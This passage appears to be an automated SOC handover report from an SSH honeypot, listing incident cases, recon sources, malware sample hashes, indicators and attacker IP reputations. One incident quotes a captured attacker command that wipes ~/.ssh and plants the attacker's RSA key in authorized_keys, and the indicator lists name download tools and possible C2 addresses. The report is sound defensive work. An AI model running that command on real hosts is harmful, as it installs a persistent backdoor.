| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:47:37` | `cowrie.session.connect` |
| `2026-07-10 18:47:37` | `cowrie.client.version` |
| `2026-07-10 18:47:37` | `cowrie.client.kex` |
| `2026-07-10 18:47:37` | `cowrie.login.success` |
| `2026-07-10 18:47:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c35e2bdef405

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-07-10 18:47 |
| **Last Seen** | 2026-07-10 18:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:47:38` | `cowrie.session.connect` |
| `2026-07-10 18:47:38` | `cowrie.client.version` |
| `2026-07-10 18:47:38` | `cowrie.client.kex` |
| `2026-07-10 18:47:38` | `cowrie.login.success` |
| `2026-07-10 18:47:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52b8f9704069

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 18:47 |
| **Last Seen** | 2026-07-10 18:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:47:44` | `cowrie.session.connect` |
| `2026-07-10 18:47:45` | `cowrie.client.version` |
| `2026-07-10 18:47:45` | `cowrie.client.kex` |
| `2026-07-10 18:47:46` | `cowrie.login.success` |
| `2026-07-10 18:47:47` | `cowrie.session.params` |
| `2026-07-10 18:47:47` | `cowrie.command.input` |
| `2026-07-10 18:47:48` | `cowrie.log.closed` |
| `2026-07-10 18:47:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97e2ae6a23d4

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 18:50 |
| **Last Seen** | 2026-07-10 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:50:09` | `cowrie.session.connect` |
| `2026-07-10 18:50:09` | `cowrie.client.version` |
| `2026-07-10 18:50:10` | `cowrie.client.kex` |
| `2026-07-10 18:50:10` | `cowrie.login.success` |
| `2026-07-10 18:50:11` | `cowrie.session.params` |
| `2026-07-10 18:50:11` | `cowrie.command.input` |
| `2026-07-10 18:50:11` | `cowrie.log.closed` |
| `2026-07-10 18:50:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98f725b10ab6

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-10 18:51 |
| **Last Seen** | 2026-07-10 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:51:59` | `cowrie.session.connect` |
| `2026-07-10 18:51:59` | `cowrie.client.version` |
| `2026-07-10 18:51:59` | `cowrie.client.kex` |
| `2026-07-10 18:52:00` | `cowrie.login.success` |
| `2026-07-10 18:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9a3d927c8b0

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-10 18:51 |
| **Last Seen** | 2026-07-10 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:51:59` | `cowrie.session.connect` |
| `2026-07-10 18:51:59` | `cowrie.client.version` |
| `2026-07-10 18:51:59` | `cowrie.client.kex` |
| `2026-07-10 18:52:00` | `cowrie.login.success` |
| `2026-07-10 18:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75c42f00d68e

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-07-10 18:52 |
| **Last Seen** | 2026-07-10 18:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:52:20` | `cowrie.session.connect` |
| `2026-07-10 18:52:20` | `cowrie.client.version` |
| `2026-07-10 18:52:20` | `cowrie.client.kex` |
| `2026-07-10 18:52:21` | `cowrie.login.success` |
| `2026-07-10 18:52:22` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d9dbf118330

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-07-10 18:52 |
| **Last Seen** | 2026-07-10 18:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:52:31` | `cowrie.session.connect` |
| `2026-07-10 18:52:31` | `cowrie.client.version` |
| `2026-07-10 18:52:31` | `cowrie.client.kex` |
| `2026-07-10 18:52:32` | `cowrie.login.success` |
| `2026-07-10 18:52:32` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:52:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74a39a3f21a3

| Field | Detail |
|---|---|
| **Source IP** | `103.189.234[.]96` |
| **First Seen** | 2026-07-10 18:52 |
| **Last Seen** | 2026-07-10 18:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:52:33` | `cowrie.session.connect` |
| `2026-07-10 18:52:33` | `cowrie.client.version` |
| `2026-07-10 18:52:33` | `cowrie.client.kex` |
| `2026-07-10 18:52:34` | `cowrie.login.success` |
| `2026-07-10 18:52:35` | `cowrie.session.params` |
| `2026-07-10 18:52:35` | `cowrie.command.input` |
| `2026-07-10 18:52:35` | `cowrie.command.failed` |
| `2026-07-10 18:52:35` | `cowrie.log.closed` |
| `2026-07-10 18:52:36` | `cowrie.session.params` |
| `2026-07-10 18:52:36` | `cowrie.command.input` |
| `2026-07-10 18:52:37` | `cowrie.session.file_download` |
| `2026-07-10 18:52:37` | `cowrie.log.closed` |
| `2026-07-10 18:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.234[.]96` to AbuseIPDB if not already reported
- [ ] Block `103.189.234[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdfd00d73467

| Field | Detail |
|---|---|
| **Source IP** | `103.189.234[.]96` |
| **First Seen** | 2026-07-10 18:52 |
| **Last Seen** | 2026-07-10 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:52:37` | `cowrie.session.connect` |
| `2026-07-10 18:52:37` | `cowrie.client.version` |
| `2026-07-10 18:52:37` | `cowrie.client.kex` |
| `2026-07-10 18:52:38` | `cowrie.login.success` |
| `2026-07-10 18:52:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.234[.]96` to AbuseIPDB if not already reported
- [ ] Block `103.189.234[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e53a041539f7

| Field | Detail |
|---|---|
| **Source IP** | `103.189.234[.]96` |
| **First Seen** | 2026-07-10 18:52 |
| **Last Seen** | 2026-07-10 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:52:38` | `cowrie.session.connect` |
| `2026-07-10 18:52:38` | `cowrie.client.version` |
| `2026-07-10 18:52:39` | `cowrie.client.kex` |
| `2026-07-10 18:52:40` | `cowrie.login.success` |
| `2026-07-10 18:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.234[.]96` to AbuseIPDB if not already reported
- [ ] Block `103.189.234[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.150.146[.]69` | **139** | 2026-07-10 16:55 | 2026-07-10 18:54 | 78m | 0 | `T1592` | 🟠 MEDIUM |
| `179.61.192[.]156` | **46** | 2026-07-10 17:06 | 2026-07-10 18:50 | 53m | 0 | `T1592` | 🟠 MEDIUM |
| `104.143.10[.]174` | **25** | 2026-07-10 16:55 | 2026-07-10 18:54 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `72.167.53[.]56` | **5** | 2026-07-10 17:00 | 2026-07-10 18:33 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-07-10 17:19 | 2026-07-10 18:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]178` | **4** | 2026-07-10 18:52 | 2026-07-10 18:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **3** | 2026-07-10 17:08 | 2026-07-10 17:57 | 2m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]232` | **2** | 2026-07-10 16:57 | 2026-07-10 17:30 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.68.22[.]115` | 1 | 2026-07-10 17:08 | 2026-07-10 17:08 | 1s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]100` | 1 | 2026-07-10 17:49 | 2026-07-10 17:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `184.178.172[.]10` | 1 | 2026-07-10 18:52 | 2026-07-10 18:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.103.243[.]179` | 1 | 2026-07-10 16:59 | 2026-07-10 17:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]120` | 1 | 2026-07-10 17:50 | 2026-07-10 17:50 | 4s | 0 | `T1592` | 🟢 LOW |
| `45.205.1[.]242` | 1 | 2026-07-10 18:23 | 2026-07-10 18:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `60.171.135[.]254` | 1 | 2026-07-10 16:57 | 2026-07-10 16:57 | 21s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]139` | 1 | 2026-07-10 18:24 | 2026-07-10 18:25 | 15s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-10 18:27 | 2026-07-10 18:27 | 1s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-10 16:59 | 2026-07-10 16:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.255.209[.]245` | 1 | 2026-07-10 18:12 | 2026-07-10 18:14 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/73** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/73** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `24.142.170[.]231` | US | Charter Communications Inc | **100** ⚠️ | 50 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `178.178.194[.]134` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |
| `106.12.38[.]73` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 2 |
| `181.48.97[.]163` | CO | Telmex Colombia S.A. | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 34 |
| `45.205.1[.]242` | BR | VPSVAULT.HOST LTD | **100** ⚠️ | 14 |
| `64.89.161[.]90` | LU | Ghosty Networks LLC | **100** ⚠️ | 28 |
| `14.54.22[.]11` | KR | Korea Telecom | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 148 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 137 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 29 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 29 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 29 |

---

## 🔕 False Positive Summary (17 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 393 cases |
| Tool 34  | Credential Extractor        | ✅ 163 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 97 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 17 filtered (4.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 62 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 137 priority case(s) shown individually · 19 recon entry/entries in table (8 group(s) consolidating 228 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
